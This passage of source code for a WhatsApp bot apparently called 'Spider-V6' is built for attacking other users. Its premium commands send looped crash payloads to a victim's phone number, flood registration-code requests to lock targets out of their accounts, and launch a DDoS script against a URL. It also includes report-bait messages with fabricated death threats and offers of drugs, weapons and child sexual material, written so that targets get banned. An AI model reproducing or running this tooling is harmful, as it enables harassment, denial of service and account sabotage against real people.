"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://telegra.ph/file/d725cb646cb63f7559486.jpg", 
"sourceUrl": " " }}}, { quoted: m }) }


const lep = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},
'message': {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
'isAnimated': []
}}}

const hw = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 60,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/d725cb646cb63f7559486.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
    
if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
if (!isBotAdmins) return
if (budy.match(`whatsapp.com`)) {
deltaxcrash.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
deltaxcrash.groupParticipantsUpdate(m.chat, [sender], 'delete')
deltaxcrash.sendMessage(m.chat, { delete: m.key })
}
}
switch (command) {
case 'HSHSGSBAAGBGhajahJSJSHSJ828292828AJANWK': {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const menu = `𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6`
           deltaxcrash.sendMessage(m.chat, { 
	           text: menu,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: 'https://telegra.ph/file/7614a322cb75d2a63105a.jpg', 
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                    })
     await deltaxcrash.sendMessage(m.chat, {
                        audio: fs.readFileSync('./all/menu.mp3'),
                        mimetype: 'all/menu.mp3',
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
             break
case 'menu': {
let itsmenu = `

   \`𝐃𝚵𝛁𝚰𝐋 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6\`
         
┏━━━━━━━━━━━
┃  ❖ 𝙷𝙴𝙻𝙻𝙾 @${sender.split("@")[0]}
┃  ❖ 𝚁𝚄𝙽𝚃𝙸𝙼𝙴  : ${runtime(process.uptime())}
┗━━━━━━━━━━
┏━━━━━━━━━━━                  
┃❖ 𝐬𝐩𝐢𝐝𝐞𝐫𝐛𝐮𝐠𝐬
┃❖ 𝐠𝐫𝐨𝐮𝐩𝐛𝐮𝐠𝐬
┃❖ 𝐨𝐰𝐧𝐞𝐫𝐦𝐞𝐧𝐮
┃❖ 𝐨𝐭𝐡𝐞𝐫𝐦𝐞𝐧𝐮
┃❖ 𝐢𝐨𝐬𝐛𝐮𝐠𝐬
┃❖ 𝐩𝐜𝐛𝐮𝐠𝐬
┃❖ 𝐬𝐩𝐢𝐝𝐞𝐫-𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩-𝐛𝐚𝐧
┃❖ 𝐬𝐚𝐦𝐬𝐮𝐧𝐠𝐛𝐮𝐠𝐬
┃❖ 𝐩𝐜𝐛𝐮𝐠𝐬
┗━━━━━━━━━━
© 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
  ` 
  deltaxcrash.sendMessage(m.chat, {
                        video: { url: `https://telegra.ph/file/9c8746c53a590f8ac2666.mp4`},
                        caption: itsmenu,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                    }
                 break
 case 'spiderbugs':{
let menya =
 `   \`𝐃𝚵𝛁𝚰𝐋 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6\`
         
┏━━━━━━━━━━━━━━━━━━
┃  ❖ 𝙷𝙴𝙻𝙻𝙾 @${sender.split("@")[0]}
┃  ❖ 𝚁𝚄𝙽𝚃𝙸𝙼𝙴  : ${runtime(process.uptime())}
┗━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━   
┃⬮ spider-virus <254xxx>
┃⬮ spidercrash <254xxx>
┃⬮ spider-web <254xxx>
┃⬮ crash-total <254xxx>
┃⬮ reboot <254xxx>
┃⬮ call999 <254xxx>
┃⬮ virus-m4 <254xxx>
┃⬮ virus-id <254xxx>,amount
┃⬮ reset-ui <254xxx>,amount
┃⬮ spider1 <254xxx>,amount
┃⬮ spider2 <254xxx>,amount
┃⬮ 🕷️<254xxx>
┃⬮ 🕸️<254xxx>
┃⬮ kill-spider <254xxx>,amount
┃⬮ spider-boom <254xxx>,amount
┃⬮ spider-web <254xxx>,amount
┃⬮ spider-vip <254xxx>
┃⬮ bug-engine
┃⬮ spiderx <254xxx>,amount
┃⬮ spiderx2 <254xxx>,amount
┃⬮ sam-bug <254xxx>
┗━━━━━━━━━━━━━━━━━
© 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
 `
deltaxcrash.sendMessage(m.chat, { 
	           text: menya,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: 'https://telegra.ph/file/1acb8cf39e54409b8621a.jpg', 
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                    })
                    }
                 break
 case 'groupbugs':{
 let menyu =
`   \`𝐃𝚵𝛁𝚰𝐋 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6\`
         
┏━━━━━━━━━━━━━━━━━━
┃  ❖ 𝙷𝙴𝙻𝙻𝙾 @${sender.split("@")[0]}
┃  ❖ 𝚁𝚄𝙽𝚃𝙸𝙼𝙴  : ${runtime(process.uptime())}
┗━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━   
┃⬮ bug-gc <jidgc>
┃⬮ ui-gc <jidgc>
┃⬮ reset-gc <linkgc>
┃⬮ gc-jid  <get gc jid>
┃⬮ kill-gc <linkgc>
┗━━━━━━━━━━━━━━━━━
 ● 𝑫𝒐𝒏𝒕 𝒃𝒍𝒂𝒎𝒆 𝒎𝒆 𝒊𝒏𝒄𝒂𝒔𝒆 𝒚𝒐𝒖𝒓 𝒘𝒉𝒂𝒕𝒔𝒂𝒑𝒑 𝒊𝒔 𝒂𝒍𝒔𝒐 𝒂𝒇𝒇𝒆𝒄𝒕𝒆𝒅
 
 © 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
 `
deltaxcrash.sendMessage(m.chat, { 
	           text: menyu,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: 'https://telegra.ph/file/1acb8cf39e54409b8621a.jpg', 
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                    })
                    }
	 break
case 'spider-whatsapp-ban':{
 let viks =
`   \`𝐃𝚵𝛁𝚰𝐋 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6\`
         
┏━━━━━━━━━━━━━━━━━━
┃  ❖ 𝙷𝙴𝙻𝙻𝙾 @${sender.split("@")[0]}
┃  ❖ 𝚁𝚄𝙽𝚃𝙸𝙼𝙴  : ${runtime(process.uptime())}
┗━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━   
┃⬮ spiderban1
┃⬮ spiderban2
┃⬮ spiderban3
┃⬮ temp-ban
┗━━━━━━━━━━━━━━━━━
 ● 𝖀𝖘𝖊 𝖙𝖍𝖊 𝖇𝖆𝖓 𝖗𝖊𝖕𝖔𝖗𝖙 𝖙𝖔 𝖇𝖆𝖓 𝖞𝖔𝖚𝖗 𝖂𝖍𝖆𝖙𝖘𝕬𝖕𝖕 𝖙𝖆𝖗𝖌𝖊𝖙 
 
 © 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
 `
deltaxcrash.sendMessage(m.chat, { 
	           text: viks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: 'https://telegra.ph/file/1acb8cf39e54409b8621a.jpg', 
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                    })
                    }
	 break
case 'iosbugs':{	
let sami =
`   \`𝐃𝚵𝛁𝚰𝐋 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6\`
         
┏━━━━━━━━━━━━━━━━━━
┃  ❖ 𝙷𝙴𝙻𝙻𝙾 @${sender.split("@")[0]}
┃  ❖ 𝚁𝚄𝙽𝚃𝙸𝙼𝙴  : ${runtime(process.uptime())}
┗━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━   
┃⬮ ios24j <254xxx>
┃⬮ iphone-ui <254xxx>
┃⬮ ios-shut <254xxx>
┃⬮ fake-ios <254xxx>
┗━━━━━━━━━━━━━━━━━
  
 © 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
 `
deltaxcrash.sendMessage(m.chat, { 
	           text: sami,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: 'https://telegra.ph/file/1acb8cf39e54409b8621a.jpg', 
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                    })
                    }
                 break
 case 'ownermenu':{
 let muna =
 `   \`𝐃𝚵𝛁𝚰𝐋 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6\`
         
┏━━━━━━━━━━━━━━━━━━
┃  ❖ 𝙷𝙴𝙻𝙻𝙾 @${sender.split("@")[0]}
┃  ❖ 𝚁𝚄𝙽𝚃𝙸𝙼𝙴  : ${runtime(process.uptime())}
┗━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━   
┃⬮ addprem
┃⬮ addowner
┃⬮ delprem
┃⬮ delowner
┃⬮ self
┃⬮ public
┗━━━━━━━━━━━━━━━━━
 © 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
 ` 
deltaxcrash.sendMessage(m.chat, { 
	           text: muna,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: 'https://telegra.ph/file/1acb8cf39e54409b8621a.jpg', 
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                    })
                    }
                 break
 case 'othermenu':{
let fuvk =
 `   \`𝐃𝚵𝛁𝚰𝐋 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6\`
         
┏━━━━━━━━━━━━━━━━━━
┃  ❖ 𝙷𝙴𝙻𝙻𝙾 @${sender.split("@")[0]}
┃  ❖ 𝚁𝚄𝙽𝚃𝙸𝙼𝙴  : ${runtime(process.uptime())}
┗━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━   
┃⬮ ping
┃⬮ runtime
┃⬮ alive
┃⬮ animeku
┗━━━━━━━━━━━━━━━━━
 © 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
 `
deltaxcrash.sendMessage(m.chat, { 
	           text: fuvk,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: 'https://telegra.ph/file/1acb8cf39e54409b8621a.jpg', 
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                    })
                    }
                 break
case 'pcbugs':{
let fuvk =
 `   \`𝐃𝚵𝛁𝚰𝐋 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6\`
         
┏━━━━━━━━━━━━━━━━━━
┃  ❖ 𝙷𝙴𝙻𝙻𝙾 @${sender.split("@")[0]}
┃  ❖ 𝚁𝚄𝙽𝚃𝙸𝙼𝙴  : ${runtime(process.uptime())}
┗━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━   
┃⬮ night-night
┃⬮ evil-mind
┃⬮ spider-chace,amount
┃⬮ pc-kill
┗━━━━━━━━━━━━━━━━━
 © 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
 `
deltaxcrash.sendMessage(m.chat, { 
	           text: fuvk,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: 'https://telegra.ph/file/1acb8cf39e54409b8621a.jpg', 
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                    })
                    }
                 break
case 'samsungbugs':{
let samie =
 `   \`𝐃𝚵𝛁𝚰𝐋 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6\`
         
┏━━━━━━━━━━━━━━━━━━
┃  ❖ 𝙷𝙴𝙻𝙻𝙾 @${sender.split("@")[0]}
┃  ❖ 𝚁𝚄𝙽𝚃𝙸𝙼𝙴  : ${runtime(process.uptime())}
┗━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━   
┃⬮ samsung-test <254xxx>
┃⬮ samsung-try  <254xxx>
┃⬮ samsung-guru <254xxx>
┃⬮ samsung-kill <254xxx>
┗━━━━━━━━━━━━━━━━━
 © 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
 `
deltaxcrash.sendMessage(m.chat, { 
	           text: samie,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: 'https://telegra.ph/file/1acb8cf39e54409b8621a.jpg', 
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                    })
                    }
                 break
		
case "owner": {
const repf = await deltaxcrash.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
deltaxcrash.sendMessage(from, { text : `Hello @${sender.split("@")[0]}, My owner is 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
		}
		
case 'self': {
if (!isOwner) return reply(`𝑌𝑜𝑢 𝑎𝑟𝑒 𝑛𝑜𝑡 𝑚𝑦 𝑜𝑤𝑛𝑒𝑟 𝑑𝑖𝑚𝑤𝑖𝑡`)
deltaxcrash.public = false
reply('succes')
}
break
case 'public': {
if (!isOwner) return reply(`𝑌𝑜𝑢 𝑎𝑟𝑒 𝑛𝑜𝑡 𝑚𝑦 𝑜𝑤𝑛𝑒𝑟 𝑑𝑖𝑚𝑤𝑖𝑡`)
deltaxcrash.public = true
reply('succes')
}
break
     
case "kill-spider": {
if (!isPremium) return reply('_</> Can only be used by premium users..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "25475766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case 'samsung-try': case 'samsung-kill': case 'samsung-kill': case 'samsung-guru': {
if (!isPremium) return reply(`add yourself premium before trying again`)
if (!q) return reply(`use .${command} 2547392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!>The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`wait for the magic`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case "spiderban1":{
if (!isPremium) return reply(`You are not a premium user sir 🚫`)
const mtban1 = `Olá, sou Ditzz Zuckerberg, sou um terrorista da Indonésia, vou te matar nos Estados Unidos (EUA), mirando na sua cabeça Mark Zuckerberg 👿, se você não quer ser morto então você você tem que entrar em contato comigo pelo aplicativo WhatsApp 🔪👇
https://api.whatsapp.com/send?phone=+254`
await reply(mtban1);
}
break
case "spiderban3":{
if (!isPremium) return reply(`You are not a premium user sir 🚫`)
const mtban2 = `olá, eu sou o terrorista que recebeu ordens de Ditzz Zuckerberg, para matar você Mark Zuckerberg 🔪👿.
https://api.whatsapp.com/send?phone=+254`
await reply(mtban2);
}
break
case "spiderban2":{
if (!isPremium) return reply(`You are not a premium user sir 🚫`)
const mtban3 = `Eu vendo itens ilegais, como 👇
Drogas
Armas de fogo
Órgãos humanos 👿
Vagina de mulher 
Vídeo pornô 🔞
Crianças sexuais 👿

Se quiser encomendar, entre em contato comigo no WhatsApp 👿👇
https://api.whatsapp.com/send?phone=+254`
await reply(mtban3);
}
break
        case 'animeku':{
            const dir = [
'https://telegra.ph/file/0d4fb93951c620aacb229.mp4',
'https://g.top4top.io/m_2391c90iu1.mp4',
'https://h.top4top.io/m_2391mfvy22.mp4',
'https://i.top4top.io/m_2391iwmee3.mp4',
'https://j.top4top.io/m_23915x5204.mp4',
'https://l.top4top.io/m_2391e795x5.mp4',
'https://a.top4top.io/m_2391jcee66.mp4',
'https://b.top4top.io/m_2391ho0bz7.mp4',
'https://c.top4top.io/m_23910hulw8.mp4',
'https://d.top4top.io/m_2391dj01a9.mp4',
'https://e.top4top.io/m_23912fdr210.mp4',
'https://a.top4top.io/m_23911dhqx1.mp4',
'https://b.top4top.io/m_2391wwr402.mp4',
'https://c.top4top.io/m_2391vfkp63.mp4',
'https://d.top4top.io/m_2391b7cey4.mp4',
'https://e.top4top.io/m_2391fxdc85.mp4',
'https://telegra.ph/file/c3deeb5b0b7f7738a95ad.mp4',
'https://telegra.ph/file/7ca9eef850f5edc53f7f2.mp4',
'https://telegra.ph/file/44f73812ae0c19f097264.mp4',
'https://telegra.ph/file/10399f910bb90de8a6c53.mp4',
'https://telegra.ph/file/f7b440b02e742d1d4bed6.mp4',
'https://telegra.ph/file/3571f86c9c8843f48ce03.mp4',
'https://telegra.ph/file/c0b4e700e2d696f6ae448.mp4',
'https://telegra.ph/file/c0b4e700e2d696f6ae448.mp4',
'https://telegra.ph/file/fbfa5ac6baca454de22ad.mp4',
'https://telegra.ph/file/899cb30e29de1f0692ea1.mp4',
'https://telegra.ph/file/30e226e2d30e51bda678f.mp4',
'https://telegra.ph/file/4b20016e2f4ff925470fea.mp4',
'https://telegra.ph/file/d48fde63f91f9aa585716.mp4',
'https://telegra.ph/file/3a1f2afb1172b4606cd50.mp4',
'https://telegra.ph/file/fe7de67cadcddf80e4f23.mp4',
'https://telegra.ph/file/f4eabe96d994b28b7020d.mp4',
'https://telegra.ph/file/f8adc8f3af8ce6f80254b.mp4',
'https://telegra.ph/file/909a4beb3be92dae9e8ef.mp4',
'https://telegra.ph/file/57dff983fe52d49cf9e11.mp4',
'https://telegra.ph/file/70ed984ecf1382e0e74ce.mp4',
'https://telegra.ph/file/a922d3d0214e7b95dfb89.mp4',
'https://telegra.ph/file/ff7a0e8598bfd47898932.mp4',
'https://telegra.ph/file/c992c64d4bb59df46f06e.mp4',
'https://telegra.ph/file/137346459c02371cf5de9.mp4',
'https://telegra.ph/file/2ae60a3fc1509f779cba0.mp4',
'https://telegra.ph/file/223ac432cbca27313c59c.mp4',
'https://telegra.ph/file/6411bbcedc5da320b8656.mp4',
'https://telegra.ph/file/33a005837185d86435a26.mp4',
'https://telegra.ph/file/3b5cf36d1fc154ee36345.mp4',
'https://telegra.ph/file/c5606fb2547f4c8268f1bb.mp4',
'https://telegra.ph/file/a91ba184bd2faedf2ca93.mp4',
'https://telegra.ph/file/aebad466be77f72498981.mp4',
'https://telegra.ph/file/a38ff1a80c53fb374af90.mp4',
'https://telegra.ph/file/607217019e1e5952920c1.mp4',
'https://telegra.ph/file/8a98532caa714b28acce1.mp4',
'https://telegra.ph/file/9eb4be5e79b7e71bfecc5.mp4',
'https://telegra.ph/file/10bbd3972f7b75a8b2ef6.mp4',
'https://telegra.ph/file/3fae1c6aacaba812ea651.mp4',
'https://telegra.ph/file/68378ab14e55b8a4113c2.mp4',
'https://telegra.ph/file/9cb140f6f74012cce30c7.mp4',
'https://telegra.ph/file/17a3d58921c2754cf86ef.mp4',
'https://telegra.ph/file/3ac2c8447b8915a879e7a.mp4',
'https://telegra.ph/file/269cd09dcf42f8bd3a6f9.mp4',
'https://telegra.ph/file/d2e59e56cfdaac79ca7f8.mp4',
'https://telegra.ph/file/504ac80844f99a8e3fc54.mp4',
'https://telegra.ph/file/dd2b8fba0010f539085d1.mp4',
'https://telegra.ph/file/af9726aad0dce10dc4529.mp4',
'https://telegra.ph/file/c693724dba3bb96bb6c70.mp4',
'https://telegra.ph/file/5b91438135d01c11e7c92.mp4',
'https://telegra.ph/file/d2a468ff7cd4c29dcdb4a.mp4',
'https://telegra.ph/file/9cc245954979317b3484c.mp4',
'https://telegra.ph/file/cde12f0fd2c73ab8eb933.mp4',
'https://telegra.ph/file/ab58119a87c7f2c2367dc.mp4',
'https://telegra.ph/file/9146e2d5490c1b01c6e87.mp4',
'https://telegra.ph/file/09c9e72d3e0d44175c304.mp4',
'https://telegra.ph/file/2f01ddd037c40477ed07f.mp4',
'https://telegra.ph/file/be72f95d92490f0a1db3b.mp4',
'https://telegra.ph/file/d1464f070543fb3aaeaee.mp4',
'https://telegra.ph/file/99f02aa82825f1bf61e9a.mp4',
'https://telegra.ph/file/d540762b1d4f9e767357d.mp4',
'https://telegra.ph/file/98d09d227e8552d4e2bea.mp4',
'https://telegra.ph/file/4a9dc4ba09484791dfa9a.mp4',
'https://telegra.ph/file/91d8701c2783775637125.mp4',
]
            await deltaxcrash.sendMessage(m.chat, { video: { url: dir[Math.floor(Math.random() * dir.length)] }, caption: `*_</> done. video anime by deltacrash_*` }, { quoted: m })
	}
        break
case 'temp-ban': {
if (!isPremium) return reply(mess.prem)
if (!text) return reply(`Example: ${prefix + command} 254|7872627288`)
if (!/|/.test(text)) return reply(`The data you provided is invalid!, Example: \n ${command} 254|7872627288`)
let numbers = JSON.parse(fs.readFileSync('./tb/numbers.json'))

let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number

await reply(`❗ Success! Registration Interference has been successfully activated to the target : ${fullNo} using ${command} for an unlimited period of time ✅. Registration interruption will be stopped if the server is restarted, shut down, or down Ⓜ️..`)

let { state, saveCreds } = await useMultiFileAuthState('tb')

let spam = makeWaSocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})

let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})

if (res.reason === 'temporarily_unavailable') {
console.log(`Invalid Number (Possible Registration Interrupted): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}

numbers[fullNo] = { cCode, number };
fs.writeFileSync('./tb/numbers.json', JSON.stringify(numbers, null, '\t'));
setInterval(() => {
dropNumber()
}, 400)
}
break
        
case 'buypanel': {
if (!isPremium) return reply(`𝑌𝑜𝑢 𝑎𝑟𝑒 𝑛𝑜𝑡 𝑚𝑦 𝑜𝑤𝑛𝑒𝑟 𝑑𝑖𝑚𝑤𝑖𝑡`)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply(`Please wait. ddos attack is running for ${time} seconds. Thank you for your patience..`);
exec(`node ./SamTech/samcrashddos.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
case 'pc-kill': case 'evil-mind': case 'night-night':  {
if (!isPremium) return 
for (let j = 0; j < 5; j++) {
await ngeloc(m.chat, force)
}
await deltaxcrash.sendMessage(m.chat, {
contextInfo: {
mentionedJid: ['00000@s.whatsapp.net'],
externalAdReply: {
showAdAttribution: false,
renderLargerThumbnail: false,
jpegThumbnail: `https://telegra.ph/file/b127513eb930ee73178dd.jpg`,
title: `𝐒𝐩𝐢𝐝𝐞𝐫-𝐕6💀`,
body: `⁗ ⋄Target down 💀🥹`,
previewType: "VIDEO",
sourceUrl: `༑ 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒💀𝐒𝐩𝐢𝐝𝐞𝐫-𝐕6⿻`,
mediaType: 1,
mediaUrl: 'https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e'
}
},
text: '𝙏𝙖𝙧𝙜𝙚𝙩 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙚𝙡𝙞𝙢𝙞𝙣𝙖𝙩𝙚𝙙 𝘽𝙮 *𝙎𝙥𝙞𝙙𝙚𝙧-𝙑6* 𝘽𝙮  𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 '
}, {
quoted: m
})
}
break


case 'reboot': { 
if (!isPremium) return reply(`𝑌𝑜𝑢 𝑎𝑟𝑒 𝑛𝑜𝑡 𝑚𝑦 𝑜𝑤𝑛𝑒𝑟 𝑑𝑖𝑚𝑤𝑖𝑡`)
if (!q) return reply(`Use .${command} 25473123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> The number starts with the number 0. Replace it with the number that starts with it country code\n\n<✓> Example : .${command} 25473123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> Bugs have been sent... `)
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
